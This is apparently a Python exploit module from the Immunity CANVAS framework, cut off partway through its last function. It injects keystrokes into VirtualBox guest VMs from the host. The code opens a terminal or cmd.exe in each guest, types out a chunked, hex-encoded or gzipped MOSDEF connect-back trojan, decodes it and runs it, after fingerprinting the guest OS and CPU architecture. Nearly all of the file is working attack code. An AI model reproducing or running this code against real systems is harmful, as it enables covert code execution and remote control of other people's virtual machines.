#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  vbox_vm_keystroke_injection.py
## Description:
##            :
## Created_On :  Tue Mar  5 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import re
import struct
import socket
import time
import gzip
import random
import logging
from timeit import default_timer as timer

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvaserror import *
from libs.canvasos import canvasos
import canvasengine
from ExploitTypes.utility import Utility
from tcpexploit import *

# virtualization API
import libs.virtualization.virtualbox.libvboxmanage as vboxmanage
import libs.virtualization.virtualbox.rpc as vboxrpc
import libs.virtualization.virtualbox.ipc as vboxipc


NAME                     = "vbox_vm_keystroke_injection"
DESCRIPTION              = "Achieve a Vbox host to Vbox guest(s) code execution attack using keystrokes injection"
VERSION                  = "1.0"
GTK2_DIALOG              = "dialog.glade2"

PROPERTY                 = {}
PROPERTY['TYPE']         = "Commands"
PROPERTY['ARCH']         = [ ["Linux"], ["Windows"] ]
PROPERTY['VERSION']      = [ "All" ]
PROPERTY['SITE']         = "Trojans"

DOCUMENTATION            = {}
DOCUMENTATION["Warning"] = "Can only be used from a Linux node for now and currently restricted to VirtualBox 5.2.x and 6.0.x"
DOCUMENTATION["Notes"]   = """

This exploit uses key injection to achieve the RCE as it does not require any
specific credentials contrary to the run command feature from vboxmanage.

This attack is not exploiting any bug but rather a feature. Indeed key injection
is meant to be used during installation process when credentials are not set. It
is thus unlikely to be ever patched.
"""

###
# Globals
###

NBR_ATTEMPTS = 5
CANONICAL_ADDR_LOWER_KERNEL = 0xFFFF800000000000L
CANONICAL_ADDR_UPPER_KERNEL = 0xFFFFFFFFFFFFFFFFL
DEFAULT_VBS_CONVERTER_NAME  = 'foo.vbs'

MOSDEF_WIN_FNAME            = 'cb.exe' # TODO: change the name!
MOSDEF_WIN_ENCODED_FNAME    = 'm'

MOSDEF_LIN_FNAME            = 'cb'
NR_MOSDEF_LINUX_PART        = 10

###
# Keystroke API
###

simple_key = {
    'Esc'   : 0x01,
    'Tab'   : 0x0f,
    '['     : 0x1a,
    ']'     : 0x1b,
    'Enter' : 0x1c,
    'LCtrl' : 0x1d,
    'LShift': 0x2a,
    '\\'    : 0x2b,
    'LAlt'    : 0x38,
    'SpaceBar': 0x39,
    'F1' : 0x3b, 'F2' : 0x3c, 'F3': 0x3d,
    'F4' : 0x3e, 'F5' : 0x3f, 'F6': 0x40,
    'F7' : 0x41, 'F8' : 0x42, 'F9': 0x43,
    'F10': 0x44, 'Del': 0x53,
    'q': 0x10, 'w': 0x11, 'e' : 0x12,
    'r': 0x13, 't': 0x14, 'y' : 0x15,
    'u': 0x16, 'i': 0x17, 'o' : 0x18,
    'p': 0x19, 'a': 0x1e, 's' : 0x1f,
    'd': 0x20, 'f': 0x21, 'g' : 0x22,
    'h': 0x23, 'j': 0x24, 'k' : 0x25,
    'l': 0x26, ';': 0x27, '\'': 0x28,
    'z': 0x2c, 'x': 0x2d, 'c' : 0x2e,
    'v': 0x2f, 'b': 0x30, 'n' : 0x31,
    'm': 0x32, ',': 0x33, '.' : 0x34,
    '/': 0x35, '-': 0x0c, '=' : 0x0d,
    '`': 0x29,
    '1': 0x02, '2': 0x03, '3': 0x04,
    '4': 0x05, '5': 0x06, '6': 0x07,
    '7': 0x08, '8': 0x09, '9': 0x0a,
    '0': 0x0b,
}

key_with_shift = {
    '!' : 0x02,
    '@' : 0x03,
    '#' : 0x04,
    '$' : 0x05,
    '%' : 0x06,
    '^' : 0x07,
    '&' : 0x08,
    '*' : 0x09,
    '(' : 0x0a,
    ')' : 0x0b,
    '_' : 0x0c,
    '+' : 0x0d,
    '{' : 0x1a,
    '}' : 0x1b,
    ':' : 0x27,
    '"' : 0x28,
    '~' : 0x29,
    '|' : 0x2b,
    '<' : 0x33,
    '>' : 0x34,
    '?' : 0x35,
}

def ascii_string_to_scancode_array(s):
    '''
    Transforms a string into the corresponding scancode array.
    '''

    L1 = list(s)
    L2 = []

    for elt in L1:

        if elt == '\n':
            code = simple_key['Enter']
            L2.append(code)
            L2.append(code|0x80)

        elif elt == '\t':
            code = simple_key['Tab']
            L2.append(code)
            L2.append(code|0x80)

        elif elt == ' ':
            code = simple_key['SpaceBar']
            L2.append(code)
            L2.append(code|0x80)

        elif simple_key.has_key(elt):
            code = simple_key[elt]
            L2.append(code)
            L2.append(code|0x80)

        # We need to use the shift
        elif ord(elt) >= ord('A') and ord(elt) <= ord('Z'):
            code = simple_key[elt.lower()]
            L2.append(0x2a)
            L2.append(code)
            L2.append(code|0x80)
            L2.append(0xaa)

        elif key_with_shift.has_key(elt):
            code = key_with_shift[elt]
            L2.append(0x2a)
            L2.append(code)
            L2.append(code|0x80)
            L2.append(0xaa)

        else:
            logging.error("[-] Unhandled code: %.2x" % ord(elt))
            continue

    return L2


# Universal payload

reset_scancodes_array = [ key|0x80 for key in simple_key.values() ]
def generate_universal_reset_keyboard_payload():
    '''
    Resets the keyboard.
    '''
    return [ reset_scancodes_array ]

# Windows payload generators

def generate_windows_runcmd_payload():
    '''
    Runs a CMD.exe.
    '''
    scancodes = []
    scancodes.append([0xe0, 0x5b, 0x13, 0xe0, 0xdb, 0x93])
    scancodes.append(ascii_string_to_scancode_array('cmd\n'))
    return scancodes

def generate_windows_stage1_push_converter_payload():
    '''
    Writes a VBS script on the disk.
    '''

    script  = 'Set fso = CreateObject("Scripting.FileSystemObject")\n'
    script += 'Set dict = CreateObject("Scripting.Dictionary")\n'
    script += 'Set file = fso.OpenTextFile (WScript.Arguments.Unnamed(0), 1)\n'
    script += 'row = 0\n'
    script += 'Do Until file.AtEndOfStream\n'
    script += '  line = file.Readline\n'
    script += '  dict.Add row, line\n'
    script += '  row = row + 1\n'
    script += 'Loop\n'
    script += 'file.Close\n'
    script += 'Dim a\n'
    script += 'For Each line in dict.Items\n'
    script += '  a = Split(line)\n'
    script += '  For i=0 To Cint(a(0))-1\n'
    script += '    For j=0 To (Len(a(1))/2-1)\n'
    script += '      WScript.StdOut.Write Chr("&H" + Mid(a(1), 1+2*j, 2))\n'
    script += '    Next\n'
    script += '  Next\n'
    script += 'Next\n'

    scancodes = []
    code_lines = script.split('\n')
    for i in xrange(len(code_lines)-1):
        line = code_lines[i]
        if not i:
            scancodes.append(ascii_string_to_scancode_array('echo %s > %s\n' % (line, DEFAULT_VBS_CONVERTER_NAME)))
        else:
            scancodes.append(ascii_string_to_scancode_array('echo %s >> %s\n' % (line, DEFAULT_VBS_CONVERTER_NAME)))
    return scancodes

def generate_windows_stage2_push_mosdef_payload(mosdef_payload):
    '''
    Writes an encoded version of the mosdef payload
    '''
    s1 = ''
    s2 = ''
    L = []

    for i in xrange(len(mosdef_payload)):
        c = ord(mosdef_payload[i])
        if c:
            if s2:
                L.append((len(s2), '00'))
                s2 = ''
            s1 += mosdef_payload[i]
        else:
            if s1:
                s3 = ''.join([ "%.2x" % ord(s1[i]) for i in xrange(len(s1)) ] )
                L.append((1,s3))
                s1 = ''
            s2 += '\0'
    if s1:
        s3 = ''.join([ "%.2x" % ord(s1[i]) for i in xrange(len(s1)) ] )
        L.append((1,s3))
    if s2:
        L.append((len(s2), '00'))

    scancodes = []
    for i in xrange(len(L)):
        l,s = L[i]
        if i:
            scancodes.append(ascii_string_to_scancode_array('echo %s %s >> %s\n' % (l,s,MOSDEF_WIN_ENCODED_FNAME)))
        else:
            scancodes.append(ascii_string_to_scancode_array('echo %s %s > %s\n' % (l,s,MOSDEF_WIN_ENCODED_FNAME)))
    return scancodes

def generate_windows_stage3_decode_mosdef_payload():
    '''
    Decodes the mosdef payload.
    '''
    scancodes = []
    scancodes.append(ascii_string_to_scancode_array('cscript //nologo //E:VBScript %s %s > %s\n' % (DEFAULT_VBS_CONVERTER_NAME,
                                                                                                    MOSDEF_WIN_ENCODED_FNAME,
                                                                                                    MOSDEF_WIN_FNAME)))
    return scancodes

def generate_windows_stage4_execute_mosdef_payload():
    '''
    Executes the mosdef payload.
    '''
    scancodes = []
    scancodes.append(ascii_string_to_scancode_array('%s\n' % MOSDEF_WIN_FNAME))
    return scancodes


# Linux payload generators

def generate_xfce4_runxterm_payload():
    '''
    Runs a terminal.
    '''
    scancodes = []
    scancodes.append([0xe0, 0x5b, 0x14, 0x14|0x80, 0xe0, 0xdb ]) # Does Win+T for Xfce4    (new console)
    # Dummy (harmless) command to trigger the focus
    scancodes.append(ascii_string_to_scancode_array('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n'))
    scancodes.append(ascii_string_to_scancode_array('id\n'))
    return scancodes

def generate_kde_runxterm_payload():
    '''
    Runs a terminal.
    '''
    scancodes = []
    scancodes.append([0x38, 0x3c, 0x38|0x80, 0x3c|0x80]) # Does ALT+F2 for KDE  (new console)
    scancodes.append(ascii_string_to_scancode_array('konsole'))
    return scancodes

def generate_gnome_runterm_payload():
    '''
    Runs a terminal.
    '''
    scancodes = []
    scancodes.append([0x01, 0x01|0x80, 0x01, 0x01|0x80]) # Does ESC twice for GNOME  (new console)
    scancodes.append([0x1d, 0x38, 0x14, 0x14|0x80, 0x1d|0x80, 0x38|0x80]) # Does CTRL+ATL+T for GNOME  (new console)
    return scancodes

def generate_kde_runxterm_payload2():
    '''
    Runs a terminal.
    '''
    scancodes = []
    scancodes.append([0x1c, 0x1c|0x80]) # Enter
    return scancodes


def generate_linux_push_mosdef_payload(mosdef_payload, index=0):
    '''
    Writes an encoded version of the mosdef payload
    '''

    def myrepr(s):

        s2 = ''
        for i in xrange(len(s)):
            current_char = s[i]
            s2 += '\\x%.2x' % ord(current_char)

        return s2

    mosdef_compressed_fname = '%s_%.2d.gz' % (MOSDEF_LIN_FNAME, index)

    with gzip.open(mosdef_compressed_fname, 'wb') as f:
        f.write(mosdef_payload)

    # Gets the compressed payload
    f = open(mosdef_compressed_fname)
    s = f.read()
    f.close()

    # Removes the compressed file
    os.unlink(mosdef_compressed_fname)

    RANGE=16
    L1 = []
    L3 = []
    for i in xrange(len(s)/RANGE):
        s1 = s[i*RANGE:i*RANGE+RANGE]
        L1.append(s1)
        s3 = myrepr(s1)
        L3.append(s3)

    s1 = s[(len(s)/RANGE)*RANGE:]
    L1.append(s1)
    s3 = myrepr(s1)
    L3.append(s3)

    assert(''.join(L1) == s)

    scancodes = []
    scancodes.append(ascii_string_to_scancode_array('rm -f %s\n' % mosdef_compressed_fname))
    for i in xrange(len(L3)):
        l = L3[i]
        if i:
            scancodes.append(ascii_string_to_scancode_array("echo -e -n \'%s\' >> %s\n" % (l, mosdef_compressed_fname)))
        else:
            scancodes.append(ascii_string_to_scancode_array("echo -e -n \'%s\' > %s\n" % (l, mosdef_compressed_fname)))

    return scancodes


def generate_linux_decode_and_exec_connectback_payload(index=0):
    '''
    Decompresses and executes the mosdef payload.
    '''

    scancodes = []
    scancodes.append(ascii_string_to_scancode_array('rm -f %s\n' % MOSDEF_LIN_FNAME))
    scancodes.append(ascii_string_to_scancode_array('sync\n'))
    for i in xrange(NR_MOSDEF_LINUX_PART):
        mosdef_compressed_fname = '%s_%.2d.gz' % (MOSDEF_LIN_FNAME, i)
        scancodes.append(ascii_string_to_scancode_array('gunzip -c %s >> %s\n' % (mosdef_compressed_fname, MOSDEF_LIN_FNAME)))
    scancodes.append(ascii_string_to_scancode_array('chmod +x %s\n' % MOSDEF_LIN_FNAME))
    scancodes.append(ascii_string_to_scancode_array('./%s &\n' % MOSDEF_LIN_FNAME))
    return scancodes

def generate_linux_exec_connectback_payload(index=0):
    '''
    Decompresses and executes the mosdef payload.
    '''

    scancodes = []
    scancodes.append(ascii_string_to_scancode_array('./%s &\n' % MOSDEF_LIN_FNAME))
    return scancodes


###
# The main class
###

class theexploit(tcpexploit):

    ###
    # Class's API.
    ###

    def __init__(self):
        tcpexploit.__init__(self)
        self.result            = ""
        self.name              = NAME
        self.local_path        = os.path.dirname(__file__)
        self.clientname        = None
        self.debug             = False
        self.respath           = os.path.abspath(os.path.join(self.local_path, "Resources/"))
        self.node_fd           = None
        self.node_vboxsvc_path = None
        self.with_timer        = True
        self.force_upload      = False

        if not os.path.exists(self.respath): os.mkdir(self.respath)

    def getargs(self):
        '''
        The arguments handling function
        '''

        self.debug = bool(self.argsDict.get('debug', self.debug))
        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)
        self.force_upload = bool(self.argsDict.get('force_upload', self.force_upload))

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def build_universal_trojan(self, os_version="Linux", os_arch="X64"):
        '''
        Builds the callback.
        os_version must be "Linux" or "WINDOWS"
        os_arch must be "X86" or "X64"
        '''

        t_os = canvasos(os_version)
        t_os.arch = os_arch

        logging.info("Callback set to %s:%s" % (self.callback.ip, self.callback.port))

        try:
            ret = self.buildmosdeftrojan(self.callback.ip,
                                         self.callback.port,
                                         target_os=t_os,
                                         universal=True,
                                         http=False,
                                         ssl=False)
            if ret:
                if os_version == 'WINDOWS':
                    cb_name = "cb_%s.exe" % os_arch
                else:
                    cb_name = "cb.linux.%s" % os_arch
                filename = os.path.join(self.respath, cb_name)
                with open(filename,"wb") as f:
                    f.write(self.mosdeftrojan)
        except Exception, err:
            logging.error("Problem building MOSDEF trojan: %s" % str(err))
            return False
        else:
            return True


    ###
    # VBOX - Common API
    ###


    def vbox_common_getproperty(self, target_iid, property_str):
        '''
        Returns the value associated with a specific property stored within the IMachine class (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, value = vboxmanage.vboxmanage_guestproperty_get(target_iid, property_str, handlers=self.handlers)
            if not status:
                return 0, value

        return status, None


    def vbox_common_osdetect(self, target_iid):
        '''
        Loads all DBGF plug-in and detects the OS version (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, value = vboxmanage.vboxmanage_debugvm_osdetect(target_iid, handlers=self.handlers)
            if not status:
                return 0, value

        return status, None


    def vbox_common_getregisters(self, target_iid, registers):
        '''
        Returns the registers values by calling the IMachineDebugger class (WRAPPER)
        Note: We mostly use this for information leak and fingerprinting.
        '''

        for i in xrange(NBR_ATTEMPTS):
            status, reg_values = vboxmanage.vboxmanage_debugvm_getregisters(target_iid, registers=registers, handlers=self.handlers)
            if not status:
                return 0, reg_values

        return status, None


    def __vbox_common_keystroke_inject(self, target_iid, scancodes_array):
        '''
        Send the scancodes values by calling the IKeyboard class (CORE)
        '''

        try:
            ipcc = vboxmanage.IPC_class()
            ipcc.set_handlers(self.handlers)
            ret, e = ipcc.start()
            if ret:
                logging.warn('Failed to contact VboxSVC! [err=%s]' % str(e))
                return -2

            ipcc.send_clienthello()
            ipcc.define_target()
            ipcc.resolve_clientname()

            iid = ipcc.get_iid_by_name('IVIRTUALBOX_IID')
            ret, pIVirtualBox = ipcc.dconnect_setup_newinstclassid(iid=iid)
            if ret:
                logging.error('dconnect_setup_newinstclassid() failed [err=0x%x]' % (ret & 0xffffffff))
                return -3

            ipcc.dconnect_invoke(instance=pIVirtualBox, method_index=5)

            iid = ipcc.get_iid_by_name('IVIRTUALBOX_IID')
            ret, ptr1 = ipcc.dconnect_setup_queryinterface(iid=iid, instance=pIVirtualBox)
            if ret:
                logging.error('dconnect_setup_queryinterface() failed [err0=0x%x]' % (ret & 0xffffffff))
                return -4

            ipcc.dconnect_release(instance=pIVirtualBox)

            ret, pTargetMachine = ipcc.dconnect_ivirtualbox_findmachine(pIVirtualBox, machine_iid=target_iid)
            if ret:
                logging.error('dconnect_ivirtualbox_findmachine() failed [err=0x%x]' % (ret & 0xffffffff))
                return -5

            pTargetMachine &= (~1)
            ret, pISession, dco_seqnum = ipcc.dconnect_imachine_lockmachine(pTargetMachine, instance=pTargetMachine|1)
            if ret:
                logging.error('dconnect_imachine_lockmachine() failed [err=0x%x]' % (ret & 0xffffffff))
                return -6

            status, ans = ipcc.dconnect_setup_reply(0x7f72cc000f80,
                                                    0,
                                                    dconnect_request_id=(dco_seqnum+1),
                                                    ret_class=vboxrpc.Session_AssignRemoteMachine_Ret)
            if status:
                logging.error('dconnect_setup_reply() failed [err=0x%x]' % (status & 0xffffffff))
                return -7

            dco_seq_num = ans.get_dconnect_header().get_header().get_request_index()
            payload = ans.get_payload()
            pIMachine = payload.get_imachine_ptr(with_flag=False)
            pIConsole = payload.get_iconsole_ptr(with_flag=False)

            status, ptr1 = ipcc.dconnect_setup_queryinterface(iid=vboxipc.IINTERNAL_MACHINE_CONTROL_IID, instance=pIMachine)
            if status:
                logging.error('dconnect_setup_queryinterface() failed [err1=0x%x]' % (status & 0xffffffff))
                return -9

            status, ans = ipcc.dconnect_invoke(instance=pIMachine, method_index=3)
            if status:
                logging.error('dconnect_invoke() failed [err=0x%x]' % (status & 0xffffffff))
                return -10

            status, ans = ipcc.dconnect_invoke_reply(0, dco_req_index=dco_seq_num)
            if status:
                logging.error('dconnect_invoke_reply() failed [err=0x%x]' % (status & 0xffffffff))
                return -11

            status, ptr1 = ipcc.dconnect_setup_queryinterface(iid=vboxipc.ICONSOLE_IID, instance=pIConsole)
            if status:
                logging.error('dconnect_setup_queryinterface() failed [err2=0x%x]' % (status & 0xffffffff))
                return -12

            iid = ipcc.get_iid_by_name('IMACHINE_IID')
            status, ptr1 = ipcc.dconnect_setup_queryinterface(iid=iid, instance=pIMachine)
            if status:
                logging.error('dconnect_setup_queryinterface() failed [err3=0x%x]' % (status & 0xffffffff))
                return -13

            method_index = ipcc.get_invoke_method_by_name('IConsole.GetKeyboard')
            status, ans = ipcc.dconnect_invoke(instance=pIConsole,
                                               method_index=method_index,
                                               ret_class=vboxrpc.IConsole_GetKeyboard_Ret)
            if status:
                logging.error('dconnect_invoke() failed [err=0x%x]' % (status & 0xffffffff))
                return -14

            pIKeyboard = ans.get_payload().get_instance() & (~1)

            # PutScancode()
            nr_scancodes_total = sum(map(lambda x: len(x), scancodes_array))
            nr_scancodes_injected = 0

            if self.handlers and self.handlers.has_key('send_scancodes'):
                send_scancodes_handler = self.handlers['send_scancodes']
                ret = send_scancodes_handler(ipcc, pIKeyboard, scancodes_array)
                time.sleep(0.005)
                if ret:
                    logging.error('Injection error, please restart sequence!')
                    ipcc.dconnect_release(instance=pIKeyboard)
                    ipcc.dconnect_release(instance=pIMachine)
                    ipcc.dconnect_release(instance=pIConsole)
                    ipcc.close_connection()
                    return -99

            else:
                for scancodes in scancodes_array:

                    percent = 100.0 * float(nr_scancodes_injected) / float(nr_scancodes_total)
                    logging.info("Attempting to inject %d scancodes... [%.2f%%]" % (len(scancodes),percent))
                    for scancode in scancodes:

                        method_index = ipcc.get_invoke_method_by_name('IKeyboard.PutScancode')
                        arg = vboxrpc.IKeyboard_PutScancode_Args(d=scancode)
                        status, ans = ipcc.dconnect_invoke(instance=pIKeyboard, method_index=method_index, arg_class=arg)
                        if self.with_timer:
                            time.sleep(0.002) # perfect
                        if status:
                            logging.error('Injection error, please restart sequence!')
                            ipcc.dconnect_release(instance=pIKeyboard)
                            ipcc.dconnect_release(instance=pIMachine)
                            ipcc.dconnect_release(instance=pIConsole)
                            ipcc.close_connection()
                            return -99

                    if self.with_timer:
                        time.sleep(0.004) # perfect
                    nr_scancodes_injected += len(scancodes)

            ipcc.dconnect_release(instance=pIKeyboard)
            ipcc.dconnect_release(instance=pIMachine)
            ipcc.dconnect_release(instance=pIConsole)
            return 0

        except Exception as e:
            logging.error('__vbox_common_keystroke_inject() failed: %s' % str(e))
            return -1


    def vbox_common_keystroke_inject(self, target_iid, scancodes_array, nr_attempts=NBR_ATTEMPTS):
        '''
        Send the scancodes values by calling the IKeyboard class (WRAPPER)
        '''

        for i in xrange(nr_attempts):
            status = self.__vbox_common_keystroke_inject(target_iid, scancodes_array)

            logging.info('Resetting the keyboard')
            reset_scancodes = generate_universal_reset_keyboard_payload()
            self.__vbox_common_keystroke_inject(target_iid, scancodes_array=reset_scancodes)

            if not status:
                return 0

            logging.info('Attempt %d / %d failed!' % (i+1,nr_attempts))

        return status


    ###
    # Guessing functions
    ###


    def is_vbox_running(self):
        '''
        Returns True if the LocalNode is a virtualbox host, False otherwise.
        '''

        ipcc = vboxmanage.IPC_class()
        ipcc.set_handlers(self.handlers)
        ret, e = ipcc.start()
        if ret:
            return False
        ipcc.send_clienthello()
        ipcc.define_target()
        ret = ipcc.resolve_clientname()
        if not ret:
            self.clientname = ipcc.client_name
            logging.info('Found VirtualBox %s' % self.clientname)

        ipcc.close_connection()
        return True


    def guess_vm_architecture(self, iid_str):
        '''
        Detects if the VBOX VM is running a 32 or a 64 bits intel VM.
        Note: Unfortunately even with 32 bits VM, extended registers are accepted
        which is why even 32 bits VM will answer positively to RIP, RSP, etc.. while
        it makes little sense architecture wise. For that reason, we use heuristics
        based on the values of the registers always containing pointers.
        Another way, possibly faster would be through segment selectors as they are
        supposed to be stable.
        '''

        score = 0
        reg_names = ['rip','rsp','rbp']

        # This should be well enough to reach kernel land
        for i in xrange(NBR_ATTEMPTS):

            status, reg_values = self.vbox_common_getregisters(iid_str, reg_names)
            if status:
                logging.debug('Dropping sample')
                continue

            for reg_name in reg_names:
                if reg_values.has_key(reg_name):
                    try:
                        current_val = int(reg_values[reg_name], 16)
                    except:
                        continue
                    else:
                        score += int(current_val > CANONICAL_ADDR_LOWER_KERNEL and current_val < CANONICAL_ADDR_UPPER_KERNEL)

            if score > 0:
                return 'x64'

        return 'X86'


    def guess_vm_os(self, iid_str):
        '''
        Detects which OS the guest is running.
        Are we running Linux or Windows?
        We use 2 different fingerprint methods.
        '''

        status, os_version = self.vbox_common_getproperty(iid_str, '/VirtualBox/GuestInfo/OS/Product')
        if not status and os_version:
            return 0, os_version
        else:
            return self.vbox_common_osdetect(iid_str)


    ###
    # Infection functions
    ###

    def dump_scancodes(self, iid_str, scancodes_array):
        '''
        Just a debugging function.
        '''

        L = []
        for scancodes in scancodes_array:
            for scancode in scancodes:
                L.append('%.2x' % scancode)
        logging.debug('VBOX: vboxmanage controlvm %s keyboardputscancode %s' % (iid_str,' '.join(L)))

    def __infect_linux_xfce4_node(self, iid_str, mosdef_payload):
        '''
        XFCE4 only payload.
        '''

        logging.info('stage0 running xterm')
        scancodes = generate_xfce4_runxterm_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -1

        return 0

    def __infect_linux_kde_node(self, iid_str, mosdef_payload):
        '''
        KDE only payload.
        '''
        logging.info('stage0a running xterm (KDE)')
        scancodes = generate_kde_runxterm_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -1

        time.sleep(2)

        logging.info('stage0b running xterm (KDE)')
        scancodes = generate_kde_runxterm_payload2()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -2

        logging.info('stage0c running xterm (KDE)')
        scancodes = generate_kde_runxterm_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -3

        time.sleep(2)

        logging.info('stage0d running xterm (KDE)')
        scancodes = generate_kde_runxterm_payload2()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -4

        time.sleep(2)
        return 0

    def __infect_linux_gnome_node(self, iid_str, mosdef_payload):
        '''
        GNOME only payload.
        '''
        logging.info('stage0 running term (GNOME)')
        scancodes = generate_gnome_runterm_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -1

        time.sleep(2)
        return 0


    def __infect_linux_generic_node(self, iid_str, mosdef_payload):
        '''
        Generic part of the linux payload. If no mosdef payload is provided we
        expect it to have been uploaded before.
        '''

        if mosdef_payload:
            logging.info('Stage1: uploads mosdef payload')

            chunk_size = len(mosdef_payload) / (NR_MOSDEF_LINUX_PART-1)
            L = [ mosdef_payload[chunk_size*i:chunk_size+chunk_size*i] for i in xrange(len(mosdef_payload)/chunk_size+1) ]
            assert(''.join(L) == mosdef_payload)
            assert(len(L) == NR_MOSDEF_LINUX_PART)

            for i in xrange(NR_MOSDEF_LINUX_PART):
                logging.info('Pushing part %d/%d' % (i+1,NR_MOSDEF_LINUX_PART))
                mosdef_payload_part = L[i]
                scancodes = generate_linux_push_mosdef_payload(mosdef_payload_part, i)
                self.dump_scancodes(iid_str, scancodes)
                ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes, nr_attempts=10)
                if ret:
                    return -1
        else:
            logging.info('Stage1: Skips the upload of mosdef payload')

        logging.info('Stage2: execute mosdef payload')
        if mosdef_payload:
            scancodes = generate_linux_decode_and_exec_connectback_payload()
        else:
            scancodes = generate_linux_exec_connectback_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)
        if ret:
            return -2

        return 0

    def infect_linux_node(self, iid_str, mosdef_payload):
        '''
        Performs the injection against KDE/XFCE/GNOME.
        Note: Since we are blind there is no way too know which WM is used (it
        could even be none of them) so we use a combination of keystrokes working
        on both of them. Of course this means 'visual garbage' within the VM but
        we have no choice.
        '''
        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        # 1. Attempt to infect XFCE4
        ret = self.__infect_linux_xfce4_node(iid_str, mosdef_payload)
        if ret:
            return -1

        # 2. Attempt to infect KDE
        ret = self.__infect_linux_kde_node(iid_str, mosdef_payload)
        if ret:
            return -2

        # 3. Attempt to infect GNOME
        ret = self.__infect_linux_gnome_node(iid_str, mosdef_payload)
        if ret:
            return -3

        # 4. Generic payload
        ret = self.__infect_linux_generic_node(iid_str, mosdef_payload)
        if ret:
            return -4

        return 0


    def infect_windows_node_slow(self, iid_str, mosdef_payload):
        '''
        This function expects the mosdef payload to have been pre-uploaded.
        '''

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Stage0: run cmd.exe')
        scancodes = generate_windows_runcmd_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        if ret:
            return -1

        logging.info('Stage1: uploads file %s' % DEFAULT_VBS_CONVERTER_NAME)
        scancodes = generate_windows_stage1_push_converter_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        if ret:
            return -2

        logging.info('Stage2: uploads mosdef payload')
        scancodes = generate_windows_stage2_push_mosdef_payload(mosdef_payload)
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        if ret:
            return -3

        logging.info('Stage3: decodes the mosdef payload')
        scancodes = generate_windows_stage3_decode_mosdef_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret1 = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Stage4: executes the mosdef payload')
        scancodes = generate_windows_stage4_execute_mosdef_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret2 = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        if ret1 or ret2:
            return -5

        return 0

    def infect_windows_node_fast(self, iid_str):
        '''
        This function expects the mosdef payload to have been pre-uploaded.
        '''

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Stage0: run cmd.exe')
        scancodes = generate_windows_runcmd_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        if ret:
            return -2

        logging.info('Stage1: execute the payload')
        scancodes = generate_windows_stage4_execute_mosdef_payload()
        self.dump_scancodes(iid_str, scancodes)
        ret = self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        logging.info('Resetting the keyboard')
        scancodes = generate_universal_reset_keyboard_payload()
        self.dump_scancodes(iid_str, scancodes)
        self.vbox_common_keystroke_inject(iid_str, scancodes_array=scancodes)

        if ret:
            return -5

        return 0

    def infect_windows_node(self, iid_str, mosdef_payload):
        '''
        Small wrapper redirecting to the correct Windows infection API depending
        on whether a mosdef payload is passed as an argument or not.
        '''

        if mosdef_payload:
